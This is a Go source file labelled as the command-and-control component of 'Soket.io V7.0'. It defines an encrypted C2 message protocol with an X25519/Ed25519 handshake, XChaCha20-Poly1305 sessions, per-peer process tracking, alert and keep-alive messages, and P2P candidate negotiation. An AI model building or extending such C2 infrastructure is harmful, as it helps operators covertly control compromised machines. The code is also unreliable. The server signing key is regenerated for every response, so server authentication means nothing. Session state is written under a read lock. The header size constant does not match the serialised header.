// Project: Soket.io V7.0
// Module: C2 Component
// Description:  C2 Infrastructure component.


package protocol

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"sync"
	"time"

	"github.com/soket-io/gs-oyen-r/internal/crypto"
	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/crypto/curve25519"
)

const (
	MagicNumber      = 0x50484E54
	ProtocolVersion  = 0x03
	PreAuthPSK       = 0x4F59454E // "OYEN"
	MaxMessageSize   = 65536
	HeaderSize       = 16
	NonceSize        = 24
	MACSize          = 16
	Ed25519SigSize   = 64
	Ed25519PublicKey = 32
	X25519KeySize    = 32
	FingerprintSize  = 16
)

const (
	DefaultHandshakeTimeout = 60 // Seconds
)

const (
	MsgTypeHandshakeInit    uint8 = 0x01
	MsgTypeHandshakeResp    uint8 = 0x02
	MsgTypeKeyExchange      uint8 = 0x03
	MsgTypeSentinelAlert    uint8 = 0x05
	MsgTypeData             uint8 = 0x10
	MsgTypeKeepAlive        uint8 = 0x20
	MsgTypeP2PCandidate     uint8 = 0x30
	MsgTypeP2PCheck         uint8 = 0x31
	MsgTypeDisconnect       uint8 = 0xFF
)

type MessageHeader struct {
	Magic   uint32
	Version uint8
	Type    uint8
	Length  uint16
	Nonce   [NonceSize]byte
}

type HandshakeInitMessage struct {
	ClientPublicEd25519 [Ed25519PublicKey]byte
	ClientPublicX25519  [X25519KeySize]byte
	Signature           [Ed25519SigSize]byte
	Timestamp           uint64
}

type HandshakeRespMessage struct {
	ServerPublicEd25519 [Ed25519PublicKey]byte
	ServerPublicX25519  [X25519KeySize]byte
	Signature           [Ed25519SigSize]byte
	SessionFingerprint  [FingerprintSize]byte
	Timestamp           uint64
}

type DataMessage struct {
	Ciphertext []byte
	MAC        [MACSize]byte
	Nonce      [NonceSize]byte
}

type Session struct {
	mu sync.RWMutex

	PeerID      string
	ProcessName string

	ClientEd25519Pub ed25519.PublicKey
	ServerEd25519Pub ed25519.PublicKey

	ClientX25519Pub  [X25519KeySize]byte
	ServerX25519Priv [X25519KeySize]byte
	ServerX25519Pub  [X25519KeySize]byte

	SharedSecret [X25519KeySize]byte
	SessionKey   [X25519KeySize]byte
	Fingerprint  [FingerprintSize]byte

	Aead interface{}

	NonceCounter uint64

	IsEstablished bool
	CreatedAt     time.Time
	LastActivity  time.Time
}

func NewSession(peerID string) (*Session, error) {

	var serverPriv [X25519KeySize]byte
	var serverPub [X25519KeySize]byte

	if _, err := io.ReadFull(rand.Reader, serverPriv[:]); err != nil {
		return nil, fmt.Errorf("failed to generate server private key: %w", err)
	}

	curve25519.ScalarBaseMult(&serverPub, &serverPriv)

	return &Session{
		PeerID:          peerID,
		ServerX25519Priv: serverPriv,
		ServerX25519Pub:  serverPub,
		CreatedAt:       time.Now(),
		LastActivity:    time.Now(),
	}, nil
}

func (s *Session) ProcessHandshakeInit(msg *HandshakeInitMessage) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	now := uint64(time.Now().Unix())
	if msg.Timestamp < now-300 || msg.Timestamp > now+300 {
		return fmt.Errorf("invalid timestamp: possible replay attack")
	}

	s.ClientEd25519Pub = msg.ClientPublicEd25519[:]
	copy(s.ClientX25519Pub[:], msg.ClientPublicX25519[:])

	valid := ed25519.Verify(s.ClientEd25519Pub, msg.ClientPublicX25519[:], msg.Signature[:])
	if !valid {
		return fmt.Errorf("invalid Ed25519 signature")
	}

	curve25519.ScalarMult(&s.SharedSecret, &s.ServerX25519Priv, &s.ClientX25519Pub)

	sessionKey, err := crypto.DeriveSessionKey(s.SharedSecret[:])
	if err != nil {
		return fmt.Errorf("failed to derive session key: %w", err)
	}
	copy(s.SessionKey[:], sessionKey)

	fingerprint, err := crypto.ComputeFingerprint(s.SharedSecret[:])
	if err != nil {
		return fmt.Errorf("failed to compute fingerprint: %w", err)
	}
	copy(s.Fingerprint[:], fingerprint)

	aead, err := chacha20poly1305.NewX(s.SessionKey[:])
	if err != nil {
		return fmt.Errorf("failed to initialize AEAD: %w", err)
	}
	s.Aead = aead

	s.NonceCounter = 0

	return nil
}

func (s *Session) CreateHandshakeResponse() (*HandshakeRespMessage, error) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	_, serverEd25519Priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("failed to generate server Ed25519 key: %w", err)
	}
	s.ServerEd25519Pub = serverEd25519Priv.Public().(ed25519.PublicKey)

	signature := ed25519.Sign(serverEd25519Priv, s.ServerX25519Pub[:])

	msg := &HandshakeRespMessage{
		Timestamp: uint64(time.Now().Unix()),
	}
	copy(msg.ServerPublicEd25519[:], s.ServerEd25519Pub)
	copy(msg.ServerPublicX25519[:], s.ServerX25519Pub[:])
	copy(msg.Signature[:], signature)
	copy(msg.SessionFingerprint[:], s.Fingerprint[:])

	return msg, nil
}

func (s *Session) Encrypt(plaintext []byte, associatedData []byte) (*DataMessage, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.Aead == nil {
		return nil, fmt.Errorf("session not established")
	}

	nonce := make([]byte, NonceSize)
	binary.BigEndian.PutUint64(nonce[16:], s.NonceCounter)
	s.NonceCounter++

	aead := s.Aead.(interface {
		Seal(dst, nonce, plaintext, associatedData []byte) []byte
	})
	ciphertext := aead.Seal(nil, nonce, plaintext, associatedData)

	if len(ciphertext) < MACSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	msg := &DataMessage{
		Nonce:      [NonceSize]byte(nonce),
		Ciphertext: ciphertext[:len(ciphertext)-MACSize],
	}
	copy(msg.MAC[:], ciphertext[len(ciphertext)-MACSize:])

	return msg, nil
}

func (s *Session) Decrypt(msg *DataMessage, associatedData []byte) ([]byte, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if s.Aead == nil {
		return nil, fmt.Errorf("session not established")
	}

	ciphertext := make([]byte, len(msg.Ciphertext)+MACSize)
	copy(ciphertext, msg.Ciphertext)
	copy(ciphertext[len(msg.Ciphertext):], msg.MAC[:])

	aead := s.Aead.(interface {
		Open(dst, nonce, ciphertext, associatedData []byte) ([]byte, error)
	})
	plaintext, err := aead.Open(nil, msg.Nonce[:], ciphertext, associatedData)
	if err != nil {
		return nil, fmt.Errorf("decryption failed: %w", err)
	}

	s.LastActivity = time.Now()

	return plaintext, nil
}

func SerializeHeader(header *MessageHeader) []byte {
	buf := make([]byte, 4+1+1+2+NonceSize)
	binary.BigEndian.PutUint32(buf[0:], header.Magic)
	buf[4] = header.Version
	buf[5] = header.Type
	binary.BigEndian.PutUint16(buf[6:], header.Length)
	copy(buf[8:], header.Nonce[:])
	return buf
}

func DeserializeHeader(data []byte) (*MessageHeader, error) {
	if len(data) < 8+NonceSize {
		return nil, fmt.Errorf("header too short")
	}

	header := &MessageHeader{
		Magic:   binary.BigEndian.Uint32(data[0:]),
		Version: data[4],
		Type:    data[5],
		Length:  binary.BigEndian.Uint16(data[6:]),
	}
	copy(header.Nonce[:], data[8:])

	if header.Magic != MagicNumber {
		return nil, fmt.Errorf("invalid magic number: 0x%X", header.Magic)
	}

	if header.Version != ProtocolVersion {
		return nil, fmt.Errorf("unsupported protocol version: %d", header.Version)
	}

	return header, nil
}

func SerializeHandshakeInit(msg *HandshakeInitMessage) []byte {
	buf := make([]byte, Ed25519PublicKey+X25519KeySize+Ed25519SigSize+8)
	copy(buf[0:], msg.ClientPublicEd25519[:])
	copy(buf[Ed25519PublicKey:], msg.ClientPublicX25519[:])
	copy(buf[Ed25519PublicKey+X25519KeySize:], msg.Signature[:])
	binary.BigEndian.PutUint64(buf[Ed25519PublicKey+X25519KeySize+Ed25519SigSize:], msg.Timestamp)
	return buf
}

func DeserializeHandshakeInit(data []byte) (*HandshakeInitMessage, error) {
	expectedLen := Ed25519PublicKey + X25519KeySize + Ed25519SigSize + 8
	if len(data) != expectedLen {
		return nil, fmt.Errorf("invalid handshake init size: expected %d, got %d", expectedLen, len(data))
	}

	msg := &HandshakeInitMessage{}
	copy(msg.ClientPublicEd25519[:], data[0:Ed25519PublicKey])
	copy(msg.ClientPublicX25519[:], data[Ed25519PublicKey:Ed25519PublicKey+X25519KeySize])
	copy(msg.Signature[:], data[Ed25519PublicKey+X25519KeySize:Ed25519PublicKey+X25519KeySize+Ed25519SigSize])
	msg.Timestamp = binary.BigEndian.Uint64(data[Ed25519PublicKey+X25519KeySize+Ed25519SigSize:])

	return msg, nil
}

func SerializeHandshakeResp(msg *HandshakeRespMessage) []byte {
	buf := make([]byte, Ed25519PublicKey+X25519KeySize+Ed25519SigSize+FingerprintSize+8)
	copy(buf[0:], msg.ServerPublicEd25519[:])
	copy(buf[Ed25519PublicKey:], msg.ServerPublicX25519[:])
	copy(buf[Ed25519PublicKey+X25519KeySize:], msg.Signature[:])
	copy(buf[Ed25519PublicKey+X25519KeySize+Ed25519SigSize:], msg.SessionFingerprint[:])
	binary.BigEndian.PutUint64(buf[Ed25519PublicKey+X25519KeySize+Ed25519SigSize+FingerprintSize:], msg.Timestamp)
	return buf
}

func DeserializeHandshakeResp(data []byte) (*HandshakeRespMessage, error) {
	expectedLen := Ed25519PublicKey + X25519KeySize + Ed25519SigSize + FingerprintSize + 8
	if len(data) != expectedLen {
		return nil, fmt.Errorf("invalid handshake resp size: expected %d, got %d", expectedLen, len(data))
	}

	msg := &HandshakeRespMessage{}
	copy(msg.ServerPublicEd25519[:], data[0:Ed25519PublicKey])
	copy(msg.ServerPublicX25519[:], data[Ed25519PublicKey:Ed25519PublicKey+X25519KeySize])
	copy(msg.Signature[:], data[Ed25519PublicKey+X25519KeySize:Ed25519PublicKey+X25519KeySize+Ed25519SigSize])
	copy(msg.SessionFingerprint[:], data[Ed25519PublicKey+X25519KeySize+Ed25519SigSize:Ed25519PublicKey+X25519KeySize+Ed25519SigSize+FingerprintSize])
	msg.Timestamp = binary.BigEndian.Uint64(data[Ed25519PublicKey+X25519KeySize+Ed25519SigSize+FingerprintSize:])

	return msg, nil
}

type P2PCandidateType uint8

const (
	P2PCandidateHost   P2PCandidateType = 0x01
	P2PCandidateSrflx  P2PCandidateType = 0x02
	P2PCandidateRelay  P2PCandidateType = 0x03
	P2PCandidatePrflx  P2PCandidateType = 0x04
)

type P2PCandidate struct {
	Foundation string
	Priority   uint32
	Type       P2PCandidateType
	Transport  string
	Address    string
	Port       uint16
	IsActive   bool
}

type P2PCheckState uint8

const (
	P2PCheckWaiting      P2PCheckState = 0x01
	P2PCheckInProgress   P2PCheckState = 0x02
	P2PCheckSucceeded    P2PCheckState = 0x03
	P2PCheckFailed       P2PCheckState = 0x04
)

type P2PCheckPair struct {
	LocalCandidate  P2PCandidate
	RemoteCandidate P2PCandidate
	State           P2PCheckState
	TransactionID   [12]byte
	RTT             time.Duration
	IsNominated     bool
}
